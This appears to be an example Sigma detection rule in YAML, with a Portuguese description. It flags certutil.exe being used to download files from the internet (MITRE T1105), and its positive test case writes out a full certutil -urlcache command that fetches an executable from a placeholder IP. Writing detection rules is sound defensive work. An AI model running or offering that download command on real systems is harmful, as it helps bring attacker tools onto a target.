title: 'Certutil baixando arquivo da internet'
id: '4c5e0dd2-dce0-524f-bce6-fdc7ac02d94d'
status: 'stable'
description: 'O certutil é uma ferramenta de certificados, mas também baixa arquivos (-urlcache). É usado para trazer ferramentas ao alvo.'
references:
    - 'https://attack.mitre.org/techniques/T1105/'
author: 'RuleForge (regras de exemplo)'
date: '2026/10/23'
tags:
    - 'attack.command_and_control'
    - 'attack.t1105'
logsource:
    category: 'process_creation'
    product: 'windows'
detection:
    selection:
        Image|endswith: '\certutil.exe'
        CommandLine|contains|all:
            - 'urlcache'
            - 'http'
    condition: 'selection'
falsepositives:
    - 'Raro em ambientes de TI; administradores podem baixar certificados'
level: 'high'
x_tests:
    positive:
        - {Image: 'C:\Windows\System32\certutil.exe', CommandLine: 'certutil.exe -urlcache -split -f http://203.0.113.5/x.exe x.exe'}
    negative:
        - {Image: 'C:\Windows\System32\certutil.exe', CommandLine: 'certutil.exe -viewstore My'}
